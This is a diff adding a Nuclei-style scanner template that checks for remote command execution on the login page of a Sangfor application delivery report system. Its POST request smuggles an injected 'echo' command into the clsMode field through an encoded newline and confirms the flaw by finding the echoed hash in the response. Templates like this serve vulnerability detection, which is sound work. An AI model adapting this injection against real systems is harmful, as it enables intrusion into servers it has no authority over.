@@ -1,0 +1,27 @@
+id: sangfor-report-rce
+
+info:
+  name: 深信服应用交付报表远程命令执行
+  author: str1am
+  severity: critical
+  tags: sangfor,rce
+
+
+requests:
+  - raw:
+      - |
+        POST /rep/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        clsMode=cls_mode_login%0Aecho%206412121cbb2dc2cb9e460cfee7046be2%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "6412121cbb2dc2cb9e460cfee7046be2"
+        part: body
+
+      - type: status
+        status:
+          - 200
